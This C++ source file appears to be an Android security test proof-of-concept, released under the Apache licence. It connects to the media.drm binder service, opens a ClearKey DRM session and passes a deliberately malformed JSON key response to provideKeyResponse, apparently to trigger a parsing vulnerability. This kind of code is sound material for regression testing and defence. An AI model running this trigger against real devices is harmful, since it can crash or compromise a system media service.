/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <media/stagefright/foundation/ADebug.h>

#include <binder/Binder.h>
#include <binder/IPCThreadState.h>
#include <binder/IServiceManager.h>
#include <binder/ProcessState.h>

#include <media/IMediaHTTPService.h>
#include <media/IMediaPlayerService.h>
#include <media/stagefright/foundation/ALooper.h>

#include <media/mediametadataretriever.h>
#include <media/stagefright/AudioPlayer.h>
#include <media/stagefright/DataSource.h>
#include <media/stagefright/JPEGSource.h>
#include <media/stagefright/MediaDefs.h>
#include <media/stagefright/MediaErrors.h>
#include <media/stagefright/MediaExtractor.h>
#include <media/stagefright/MediaSource.h>
#include <media/stagefright/MetaData.h>
#include <media/stagefright/OMXClient.h>

#include <private/media/VideoFrame.h>

#include <media/ICrypto.h>
#include <media/IHDCP.h>
#include <media/IMediaCodecList.h>
#include <media/IMediaRecorder.h>

#include <media/AudioEffect.h>
#include <media/IAudioFlinger.h>
#include <media/IEffect.h>
#include <media/IEffectClient.h>
#include <private/media/AudioEffectShared.h>

#include <gui/ISensorEventConnection.h>
#include <gui/ISensorServer.h>

#include <binder/MemoryBase.h>
#include <binder/MemoryDealer.h>
#include <binder/MemoryHeapBase.h>

#include <gui/BufferQueue.h>
#include <gui/BufferQueueConsumer.h>
#include <gui/BufferQueueCore.h>
#include <gui/BufferQueueProducer.h>
#include <gui/CpuConsumer.h>

#include <media/IOMX.h>

#include "OMX_IndexExt.h"

#include "OMX_Component.h"
#include "OMX_QCOMExtns.h"

#include <media/hardware/HardwareAPI.h>
#include "gralloc_priv.h"

#include <media/ICrypto.h>
#include <media/IDrm.h>
#include <media/IMediaDrmService.h>
#include <media/drm/DrmAPI.h>
#include <media/hardware/CryptoAPI.h>

using namespace android;

static const uint8_t kClearKeyUUID[16] = {0x10, 0x77, 0xEF, 0xEC, 0xC0, 0xB2,
                                          0x4D, 0x02, 0xAC, 0xE3, 0x3C, 0x1E,
                                          0x52, 0xE2, 0xFB, 0x4B};

void poc() {
  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> binder = sm->getService(String16("media.drm"));
  sp<IMediaDrmService> mediaDrmService =
      interface_cast<IMediaDrmService>(binder);

  if (mediaDrmService == NULL) {
    return;
  }

  // get service interface
  sp<IDrm> drm = mediaDrmService->makeDrm();
  if (drm == NULL) {
    return;
  }

  status_t st;
  Vector<uint8_t> sessionId;
  Vector<uint8_t> sessionIdSize0;

  st = drm->createPlugin(kClearKeyUUID);

  st = drm->openSession(sessionId);

  const String8 js(
      "{"
      "\"keys\":"
      "[{"
      "\"kty\":\"oct\""
      "\"alg\":\"A128KW1\""
      "}"
      "{"
      "\"kty\":\"oct\""
      "\"alg\":\"A128KW2\""
      "\"k\":\"SGVsbG8gRnJpZW5kIQ\""
      "\"kid\":\"Y2xlYXJrZXlrZXlpZDAyx\""
      "}"
      "{"
      "\"kty\":\"oct\""
      "\"alg\":\"A128KW3\""
      "\"kid\":\"Y2xlYXJrZXlrZXlpZDAz\""
      "\"k\":\"R29vZCBkYXkh\""
      "}]"
      "}");

  Vector<uint8_t> response;
  response.insertAt((size_t)0, js.size());
  memcpy(response.editArray(), js.string(), js.size());

  Vector<uint8_t> keySetId;
  st = drm->provideKeyResponse(sessionId, response, keySetId);
}

int main() {
  android::ProcessState::self()->startThreadPool();
  poc();
  return 0;
}
